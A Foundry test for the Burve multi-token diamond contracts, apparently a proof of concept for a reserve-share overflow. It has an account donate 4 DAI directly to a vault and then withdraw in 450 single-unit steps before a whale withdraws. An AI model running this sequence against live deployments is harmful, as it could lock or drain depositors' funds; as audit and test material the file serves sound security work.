// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../../../src/multi/Diamond.sol";
import "../../..//src/multi/facets/LockFacet.sol";
import "../../../src/multi/facets/SimplexFacet.sol";
import "../../../src/multi/interfaces/IBurveMultiValue.sol";
import "../../../src/multi/interfaces/IBurveMultiSimplex.sol";
import "../../../src/multi/facets/SwapFacet.sol";
import "../../../src/multi/facets/ValueFacet.sol";
import "../../../src/multi/facets/ValueTokenFacet.sol";
import "../../../src/multi/facets/VaultFacet.sol";
import "../../../src/integrations/adjustor/DecimalAdjustor.sol";
import "../../mocks/MockERC20.sol";
import "../../../src/integrations/pseudo4626/noopVault.sol";
import "../../../src/multi/vertex/VaultProxy.sol";
import "../../../src/multi/InitLib.sol";

contract ReserveShareOverflowTest is Test {
    SimplexDiamond dia;
    address diaA;
    MockERC20 USDC;
    MockERC20 DAI;
    uint16 _cid;
    NoopVault usdc_vault;
    NoopVault dai_vault;

    function setUp() public {
        // Deploy facets
        USDC = new MockERC20("USDC", "USDC", 6);
        USDC.mint(address(this), 1_000_000_000_000e6);
        DAI = new MockERC20("DAI", "DAI", 18);
        DAI.mint(address(this), 1_000_000_000_000e18);

        address adjustor = address(new DecimalAdjustor());
        BurveFacets memory facets = InitLib.deployFacets();

        dia = new SimplexDiamond(facets, "Burve", "BRV");
        diaA = address(dia);

        usdc_vault = new NoopVault(USDC, "USDC Vault", "USDCV");
        dai_vault = new NoopVault(DAI, "DAI Vault", "DAIV");

        VaultType usdc_vault_type = VaultType.E4626;
        VaultType dai_vault_type = VaultType.E4626;

        SimplexAdminFacet(diaA).addVertex(
            address(USDC),
            address(usdc_vault),
            usdc_vault_type
        );
        SimplexAdminFacet(diaA).addVertex(
            address(DAI),
            address(dai_vault),
            dai_vault_type
        );

        deal(address(USDC), address(this), 1_000_000_000e6);
        deal(address(DAI), address(this), 1_000_000_000e18);

        USDC.approve(diaA, type(uint256).max);
        DAI.approve(diaA, type(uint256).max);

        _cid = 0x0003;
        uint128 startingTarget = 1e12;
        uint128 baseFeeX128 = 0;
        uint128 protocolTakeX128 = 0;

        SimplexAdminFacet(diaA).addClosure(_cid, startingTarget);
    }

    function testReserve() public {
        uint256[MAX_TOKENS] memory limits;
        address bob = address(0xB0B);
        address whale = address(0x11);

        deal(address(USDC), bob, 1_000_000e6);
        deal(address(DAI), bob, 1_000_000e18);
        deal(address(USDC), whale, 10_000_000e6);
        deal(address(DAI), whale, 10_000_000e18);
        vm.startPrank(whale);

        USDC.approve(diaA, type(uint256).max);
        DAI.approve(diaA, type(uint256).max);

        ValueFacet(diaA).addValue(whale, _cid, 2_000_000e18, 0, limits);

        vm.startPrank(bob);

        USDC.approve(diaA, type(uint256).max);
        DAI.approve(diaA, type(uint256).max);

        ValueFacet(diaA).addValue(bob, _cid, 450, 0, limits);

        DAI.transfer(address(dai_vault), 4);

        console.log("\nRemove value part");

        for (uint256 i = 0; i < 450; i++) {
            ValueFacet(diaA).removeValue(bob, _cid, 1, 0, limits);
        }

        vm.stopPrank();

        vm.startPrank(whale);

        ValueFacet(diaA).removeValue(whale, _cid, 2_000_000e18, 0, limits);
    }
}
